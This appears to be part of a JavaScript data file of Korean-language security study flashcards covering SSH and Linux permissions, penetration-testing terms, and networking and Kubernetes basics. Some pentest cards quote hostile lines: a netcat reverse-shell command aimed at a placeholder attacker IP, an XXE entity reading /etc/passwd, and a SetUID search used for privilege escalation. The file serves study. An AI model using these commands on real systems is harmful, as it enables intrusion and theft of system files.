        { front: 'PermitRootLogin no', back: 'SSH 설정에서 root 직접 로그인 차단\n\n/etc/ssh/sshd_config에 설정' },
        { front: 'PasswordAuthentication no', back: 'SSH 패스워드 인증 비활성화\n\n키 기반 인증만 허용하여 무차별 대입 공격 방지' },
        { front: 'SetUID 비트', back: '파일 실행 시 소유자 권한으로 실행\n\n4000 (chmod u+s)\n\n권한 상승에 악용 가능' },
        { front: 'Sticky Bit', back: '/tmp 등에 설정되어 자신의 파일만 삭제 가능\n\n1000 (chmod +t)\n\nt = 실행권한 있음, T = 실행권한 없음' },
        { front: '755 권한', back: 'rwxr-xr-x\n\n소유자: 읽기+쓰기+실행\n그룹: 읽기+실행\n기타: 읽기+실행' },
        { front: 'PAM', back: 'Pluggable Authentication Modules\n\nLinux 인증 메커니즘 플러그인 시스템\n\n/etc/pam.d/ 디렉토리에 설정 파일' }
    ],
    pentest: [
        { front: 'RCE', back: 'Remote Code Execution\n\n공격자가 원격에서 대상 시스템에서 임의의 코드 실행\n\n가장 치명적인 취약점 유형' },
        { front: 'Payload', back: '공격 시 실제로 악의적인 동작을 수행하는 코드나 데이터\n\n웹셸, 명령어, 악성 스크립트 등' },
        { front: 'Web Shell', back: '웹 서버에 업로드된 악성 스크립트\n\n브라우저를 통해 서버 명령 실행\n\nJSP, PHP, ASPX 등' },
        { front: 'Reverse Shell', back: '서버가 공격자에게 역으로 연결\n\n방화벽 아웃바운드 정책 우회\n\nnc -e /bin/sh 공격자IP 포트' },
        { front: 'Privilege Escalation', back: '권한 상승\n\n낮은 권한에서 높은 권한(root/SYSTEM) 획득\n\nSetUID, sudo, kernel exploit 악용' },
        { front: 'SetUID Exploit', back: 'SetUID 비트가 설정된 실행 파일 악용\n\nfind / -perm -4000으로 탐색\n\n파일 소유자 권한으로 실행' },
        { front: 'sudo -l', back: '현재 사용자가 sudo로 실행 가능한 명령어 확인\n\n권한 상승 경로 탐색에 사용' },
        { front: 'Lateral Movement', back: '수평 이동\n\n침투한 시스템에서 네트워크 내 다른 시스템으로 이동\n\n자격증명 재사용, Pass-the-Hash' },
        { front: 'Persistence', back: '지속성 확보\n\n재부팅 후에도 접근 유지\n\ncron, 서비스 등록, 백도어 계정' },
        { front: 'WAF Bypass', back: 'Web Application Firewall 우회\n\n인코딩, 대소문자 변형, 주석 삽입\n\nSpring4Shell에서 다양한 우회 기법 사용' },
        { front: 'Command Injection', back: 'OS 명령어 삽입 취약점\n\n; | & 등으로 명령어 체이닝\n\n입력값 검증 부재 시 발생' },
        { front: 'Path Traversal', back: '경로 탐색 공격\n\n../ 를 사용하여 의도하지 않은 파일 접근\n\n/etc/passwd 읽기' },
        { front: 'File Upload Bypass', back: '파일 업로드 제한 우회\n\nMIME type 변조, 확장자 이중화(.php.jpg)\n\n웹셸 업로드로 RCE' },
        { front: 'SSRF', back: 'Server-Side Request Forgery\n\n서버가 공격자 지정 URL에 요청\n\n내부망 스캔, 메타데이터 API 접근' },
        { front: 'XXE', back: 'XML External Entity\n\nXML 파서 악용하여 파일 읽기, SSRF\n\n<!ENTITY xxe SYSTEM "file:///etc/passwd">' }
    ],
    network: [
        { front: 'OSI 7계층', back: 'Open Systems Interconnection\n\n7-Application, 6-Presentation, 5-Session\n4-Transport, 3-Network, 2-DataLink, 1-Physical' },
        { front: 'TCP/IP 4계층', back: '4-Application (HTTP, FTP, DNS)\n3-Transport (TCP, UDP)\n2-Internet (IP, ICMP)\n1-Network Interface (Ethernet)' },
        { front: 'TCP 3-way Handshake', back: '연결 수립 과정\n\n1) SYN →\n2) ← SYN+ACK\n3) ACK →\n\n연결 확립' },
        { front: 'NAT', back: 'Network Address Translation\n\n사설 IP를 공인 IP로 변환\n\nIP 부족 문제 해결, 내부망 보호' },
        { front: 'Docker Container', back: 'OS 커널 공유하는 격리된 프로세스\n\nVM보다 가볍고 빠름\n\n이미지에서 생성, 불변성' },
        { front: 'Docker Image', back: '컨테이너 실행을 위한 읽기 전용 템플릿\n\n레이어 구조로 효율적 저장\n\nDockerfile로 빌드' },
        { front: 'Dockerfile', back: 'Docker 이미지 빌드 스크립트\n\nFROM (베이스), RUN (명령), COPY (파일)\nCMD (기본 실행 명령)' },
        { front: 'Kubernetes Pod', back: '배포 가능한 최소 단위\n\n1개 이상의 컨테이너 포함\n\n공유: IP, 볼륨, 네트워크' },
        { front: 'kubectl', back: 'Kubernetes 클러스터 제어 CLI\n\nget, describe, create, delete, apply\n\nconfig 파일로 설정 관리' },
        { front: 'Deployment', back: 'Pod의 선언적 업데이트 관리\n\n롤링 업데이트, 롤백\n\n원하는 상태 유지 (Desired State)' },
        { front: 'Service', back: 'Pod 그룹에 대한 네트워크 접근\n\nClusterIP, NodePort, LoadBalancer\n\n안정적인 엔드포인트 제공' },
        { front: 'Namespace', back: '클러스터 내 리소스 논리적 격리\n\ndefault, kube-system, kube-public\n\n멀티 테넌시 지원' },
        { front: 'ConfigMap', back: '비밀이 아닌 설정 데이터 저장\n\nKey-Value 형태\n\nPod에 환경변수/파일로 주입' },
        { front: 'Secret', back: '민감 정보 저장 (패스워드, 토큰)\n\nBase64 인코딩\n\netcd에 암호화 저장 권장' },
        { front: 'Ingress', back: 'HTTP/HTTPS 외부 접근 라우팅\n\n도메인/경로 기반 라우팅\n\nTLS 종료, 로드밸런싱' },
        { front: 'CIDR', back: 'Classless Inter-Domain Routing\n\n192.168.1.0/24 = 256개 IP\n\n/32 = 1개, /16 = 65536개' },
        { front: 'Linux 파일 권한', back: 'rwx rwx rwx (소유자/그룹/기타)\n\n4=r, 2=w, 1=x\n\n755 = rwxr-xr-x' }
    ]
};

// 내보내기
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { quizDatabase, flashcardDatabase };
}